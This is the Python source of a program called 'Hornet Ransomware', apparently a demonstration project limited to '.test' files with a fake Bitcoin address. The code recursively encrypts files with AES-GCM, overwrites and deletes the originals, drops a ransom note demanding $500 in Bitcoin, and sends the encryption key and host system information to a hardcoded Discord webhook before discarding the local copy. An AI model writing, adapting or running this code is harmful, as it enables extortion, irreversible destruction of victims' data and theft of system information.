# main.py

from cryptography.hazmat.primitives.ciphers.aead import AESGCM          # AESGCM protocol suite
from informations import collect_system_information
from exceptions import HornetRansomwareException
from typing import List, Dict, Union, Any
from rich.console import Console
from datetime import datetime, timezone, timedelta
import requests
import secrets
import os
import json
import pytz
import time
import random

# For rich and detailed error or information messages
console = Console()

def send_to_discord_with_file(message: str, data: Union[str, Dict]) -> bool:
    """
    Send a message with a JSON file attachment to Discord via a webhook.

    :param message: The message to send as a caption.
    :param data: The data to include as a file attachment (JSON or string).
    :return: True if the message and file were sent successfully, False otherwise.
    """
    webhook_url = "https://discord.com/api/webhooks/1313875651220082710/RV3tyN3A4h6sxxepIYgc8FoyXc3dROpZJQGYtXlDdZqytgT8hcpnYLBf4RqoKdLMOvym"

    # If the data is a dictionary, convert it to JSON string
    if isinstance(data, Dict):
        data = json.dumps(data, indent=4)

    # Create the file attachment
    filename = "data.json"
    files = {
        "file": (filename, data)
    }

    # Payload for the message content
    payload = {
        "content": message
    }

    try:
        # Send the message with file attachment
        response = requests.post(webhook_url, data=payload, files=files)
        if response.status_code != 200:
            raise HornetRansomwareException(
                message="Failed to send message and file to the server.",
                context={
                    "status_code": response.status_code,
                    "response": response.text
                }
            )
        return True
    except HornetRansomwareException as exc:
        print(f"Error: {exc.message}")
        if exc.context:
            print(f"Context: {exc.context}")
        return False

def encrypt_file(filepath: str, key: bytes) -> None:
    """
    A function to encrypt a single file using AES-GCM encryption with the given key.

    :param filepath: The path to the file to encrypt.
    :param key: The key to use for encryption.
    """
    try:
        with open(filepath, "rb") as file:
            data = file.read()

        # Create a AES-GCM cipher object, including 12-bytes-length nonce
        aesgcm = AESGCM(key)
        nonce  = secrets.token_bytes(12)

        ciphertext = aesgcm.encrypt(nonce, data, None)
        encrypted_filepath = f"{filepath}.enc"
        with open(encrypted_filepath, "wb") as file:
            file.write(nonce + ciphertext)
        console.log(f"Successfully encrypted {filepath} to {encrypted_filepath}.")
    except Exception as e:
        raise HornetRansomwareException(
                message = f"An error occurred while encrypting {filepath}: {e}",
                context = {
                    "filepath": filepath,
                    "key": key
                }
        )

def wipe_file(filepath: str) -> None:
    """
    Overwrite the file content with 0s and delete to completely wipe it.
    This strategy is used to prevent data recovery, especially for HDDs.

    :param filepath: The path to the file to wipe.
    """
    try:
        with open(filepath, "r+b") as file:
            file.seek(0)
            file.write(b"\x00" * os.path.getsize(filepath))
            file.truncate()
        os.remove(filepath)
        console.log(f"Successfully wiped {filepath}.")
    except Exception as e:
        raise HornetRansomwareException(
            message = f"An error occurred while wiping {filepath}: {e}",
            context = {
                "filepath": filepath,
            }
        )

def encrypt_directory_walk(directory: str, key: bytes, extensions: List[str]) -> int:
    """
    Recursively walk through a directory and encrypt all files in it.

    :param directory: The path to the directory to walk through.
    :param key: The key to use for encryption.

    :return: The number of files encrypted.
    """
    number_of_files_encrypted = 0

    # Directory must exist
    if not os.path.exists(directory):
        console.log(f"Directory {directory} does not exist.")
        return number_of_files_encrypted

    assert len(extensions) > 0, "At least one extension must be provided."

    try:
        for root, _, files in os.walk(directory):
            for file in files:
                filepath = os.path.join(root, file)
                if filepath.endswith(tuple(extensions)):
                    encrypt_file(filepath, key) 
                    wipe_file(filepath)
                    number_of_files_encrypted += 1
    except os.error as e:
        raise HornetRansomwareException(
                message = f"An error occurred while walking through the directory: {e}",
                context = {
                    "directory": directory,
                    "key": key
                }
        )
    except Exception as e:
        raise HornetRansomwareException(
                message = f"A general and unclassified error occurred while encrypting the directory: {e}",
                context = {
                    "directory": directory,
                    "key": key
                }
        )

    return number_of_files_encrypted

def generate_key() -> bytes:
    """
    Generate a random 256-bit key for AES-GCM encryption.
    
    :return: The generated key.
    """
    return secrets.token_bytes(32)


def write_note(filepath: str) -> None:
    """
   leave a ransomnote at filepath.
    """
    time.sleep(10)
    time_now = datetime.now(pytz.timezone('US/Eastern'))
    secret   = secrets.randbelow(int(time_now.timestamp()))

    # For now, to be realistic, we will create a random data into the changing data.
    fake_btc_address = ''.join(random.choices("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz", k=34))
    fake_email_address = "kn1ghtz@hacker.one.fake"

    file_name = "README.txt"
    note = os.path.join(filepath, file_name) 
    with open(note, "w") as file:
        note = f"""
        !!! Your files have been encrypted !!!
        All your important files are encrypted with a strong algorithm. You will not be able to access your files without the decryption key.
        To restore your files:
        1. Do NOT attempt to delete or modify the encrypted files. This may result in permanent data loss.
        2. Purchase Bitcoin worth $500 and send it to the following address: {fake_btc_address}
        3. Contact to us({fake_email_address}), and we'll handle your decryption procedure. 

        Remember:
        - Do NOT attempt to decrypt the files yourself. 
        - Do NOT contact any third-party recovery services as they will not help you. 
        - Failure to comply with these instructions in 48 hours will result in the loss of your files.
        """
        file.write(note)

    print(f"Ransomnote created at {filepath}")

    os.utime(filepath, (secret, secret))


if __name__ == "__main__":
    # Generate a random key for AES-GCM encryption
    key = generate_key()

    # Encrypt all files in the current directory with the given extensions
    directory = "."
    extension_list = [".test"]
    number_of_files_encrypted = encrypt_directory_walk(directory, key, extension_list)

    # write ransom note
    write_note(directory) 
    
    # Send the key to the attacker in an hexadecimal format
    key_hex = key.hex()
    console.log(f"Key was generated: {key_hex[:10]}...")
    data: Dict[str, Any] = {
        "key": key_hex,
        "number_of_files_encrypted": number_of_files_encrypted,
        "system_information": collect_system_information()
    }
    message = f"{data['system_information']['os_info']['node_name']}@{data['system_information']['os_info']['system']}"

    if send_to_discord_with_file(message = message, data = data):
        console.log(f"Data sent successfully, {len(str(message)) + len(str(data))} bytes.")
    else:
        console.log("Failed to send the data.")

    # :p
    key     = "nothing"
    key_hex = "0xnothing"
